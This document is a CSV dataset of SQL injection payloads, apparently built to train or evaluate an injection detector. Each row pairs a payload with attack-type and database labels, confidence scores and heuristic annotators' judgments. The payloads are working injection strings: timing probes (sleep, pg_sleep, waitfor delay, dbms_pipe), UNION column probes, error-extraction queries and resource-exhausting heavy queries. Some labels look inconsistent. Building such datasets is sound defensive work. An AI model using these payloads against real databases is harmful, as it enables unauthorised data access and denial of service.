payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" ) as tuem where 1328 = 1328",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1737,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as tuem where 1328 = 1328"
"-9860 ) where 8743 = 8743 union all select 8743,8743,8743,8743,8743,8743,8743--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1738,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9860 ) where 8743 = 8743 union all select 8743,8743,8743,8743,8743,8743,8743--"
"1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""rkvr"" = ""rkvr",boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1739,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""rkvr"" = ""rkvr"
"1"" ) ) as nwnp where 6140 = 6140",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1740,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as nwnp where 6140 = 6140"
-3861' ) as zmja where 4036 = 4036 or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1741,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3861' ) as zmja where 4036 = 4036 or 9323 = 9323#
"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 6715 = 6715",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1742,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 6715 = 6715"
1'+ ( select dpkp where 4836 = 4836 and sleep ( 5 ) ) +',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1743,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'+ ( select dpkp where 4836 = 4836 and sleep ( 5 ) ) +'
"-1631%"" ) or elt ( 8285 = 1709,1709 ) and ( ""%"" = """,boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1744,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-1631%"" ) or elt ( 8285 = 1709,1709 ) and ( ""%"" = """
waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1745,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,waitfor delay '0:0:5'--
1'|| ( select 'brsr' where 5458 = 5458,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1746,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'|| ( select 'brsr' where 5458 = 5458
"select count ( * ) from generate_series ( 1,5000000 ) and ( ""%"" = """,heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1747,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ""%"" = """
"iif ( 8214 = 4954,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,1748,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 8214 = 4954,1,1/0 )"
1 ) ) and 2006 = 2006,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1749,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) and 2006 = 2006
1'+ ( select 'uqaf' where 7414 = 7414,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1750,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'uqaf' where 7414 = 7414
"1"" where 9889 = 9889",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1751,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 9889 = 9889"
1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'dqoz' like 'dqoz,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1752,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'dqoz' like 'dqoz
1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 1601 = 1601,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1753,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 1601 = 1601
"-4166%"" ) union all select 5190--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1754,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4166%"" ) union all select 5190--"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( '%' = '",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1755,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( '%' = '"
"1"" ) ) as hdyn where 6027 = 6027 union all select null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1756,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as hdyn where 6027 = 6027 union all select null,null,null--"
"1'|| ( select 'jnsd' from dual where 2316 = 2316 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1757,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"1'|| ( select 'jnsd' from dual where 2316 = 2316 union all select null,null,null,null,null,null,null#"
1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ),time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1758,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) )
1 where 8393 = 8393,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1759,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 8393 = 8393
"-2013"" ) ) as kisy where 3802 = 3802 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.8,CHAR case when for blind,KEEP,,boolean_blind,firebird,1760,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"-2013"" ) ) as kisy where 3802 = 3802 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --"
-7971' union all select 4273#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1761,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-7971' union all select 4273#
1' ) ) and 2401 = 4693 and ( ( 'ssrm' = 'ssrm,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1762,boolean_blind,generic,Pattern match: 'and 2401 = 4693' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) and 2401 = 4693 and ( ( 'ssrm' = 'ssrm
"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1763,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )"
-9657' ) as ziiq where 7725 = 7725 or 3038 = 3038,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1764,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9657' ) as ziiq where 7725 = 7725 or 3038 = 3038
"-6599%"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""%"" = """,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1765,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-6599%"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""%"" = """
"-2610%"" ) union all select 7779,7779,7779,7779,7779--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1766,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2610%"" ) union all select 7779,7779,7779,7779,7779--"
"1 ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 8554 = 8554",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1767,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 8554 = 8554"
"1 ) where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1768,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--"
"1' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1769,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
"1%' ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1770,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%' ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"-7233"" ) where 7574 = 7574 or 5821 = 3288",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1771,boolean_blind,generic,Pattern match: 'or 5821 = 3288' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-7233"" ) where 7574 = 7574 or 5821 = 3288"
"-4927' ) ) union all select 1924,1924#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1772,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4927' ) ) union all select 1924,1924#"
"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""ykhp"" like ""ykhp",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1773,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""ykhp"" like ""ykhp"
"1%"" ) union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1774,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) union all select null,null,null,null--"
"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) ||'",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,1775,error_based,oracle,Pattern match: 'extractvalue (' → error_based (P4); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) ||'"
"1"" ) and elt ( 1889 = 7397,7397 ) and ( ""kuau"" = ""kuau",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1776,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" ) and elt ( 1889 = 7397,7397 ) and ( ""kuau"" = ""kuau"
"1' ) ) ) union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1777,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) ) union all select null,null,null#"
"waitfor delay '0:0:5' and ( ( ( ""mfro"" like ""mfro",time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1778,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"waitfor delay '0:0:5' and ( ( ( ""mfro"" like ""mfro"
1 ) ) as zpvn where 2767 = 2767 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1779,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) as zpvn where 2767 = 2767 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --
"-4964"" ) ) union all select 4750,4750,4750,4750,4750--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1780,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4964"" ) ) union all select 4750,4750,4750,4750,4750--"
"1%' and elt ( 4249 = 4249,7259 ) and '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1781,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%' and elt ( 4249 = 4249,7259 ) and '%' = '"
1 ) ) as ehlg where 6340 = 6340,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1782,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as ehlg where 6340 = 6340
"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,1783,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 'qfsu' = 'qfsu",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1784,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 'qfsu' = 'qfsu"
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""%"" = """,heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1785,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""%"" = """
"1%"" ) ) ) and 3116 = 9088#",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1786,boolean_blind,generic,Pattern match: 'and 3116 = 9088' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) ) ) and 3116 = 9088#"
1' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'opyp' = 'opyp,error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,1787,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'opyp' = 'opyp
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) -- pvdw",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1788,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) -- pvdw"
"1 ) as rtpl where 1262 = 1262 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1789,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) as rtpl where 1262 = 1262 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1%' ) union all select null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1790,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) union all select null,null,null--"
-4108' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'tqjx' = 'tqjx,boolean_blind,firebird,0.8,CAST for Firebird blind,KEEP,,boolean_blind,firebird,1791,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-4108' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'tqjx' = 'tqjx
"1"" ) ) as itxo where 7916 = 7916",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1792,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as itxo where 7916 = 7916"
1'+ ( select 'unpz' where 8186 = 8186,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1793,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'unpz' where 8186 = 8186
"-5124'+ ( select 'xpww' where 1752 = 1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",union_based,oracle,0.85,UNION ALL for union-based,KEEP,,union_based,oracle,1794,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5124'+ ( select 'xpww' where 1752 = 1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--"
"1"" ) where 9461 = 9461 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1795,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) where 9461 = 9461 union all select null,null,null,null,null,null,null,null,null#"
1 ) as hvsk where 7902 = 7902,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1796,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as hvsk where 7902 = 7902
1' ) as bscn where 6907 = 6907,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1797,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as bscn where 6907 = 6907
-7453' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1798,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7453' ) ) ) or 8571 = 8571--
1' where 2134 = 2134 rlike ( select ( case when ( 3613 = 2090 ) then 1 else 0x28 end ) ) --,boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1799,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' where 2134 = 2134 rlike ( select ( case when ( 3613 = 2090 ) then 1 else 0x28 end ) ) --
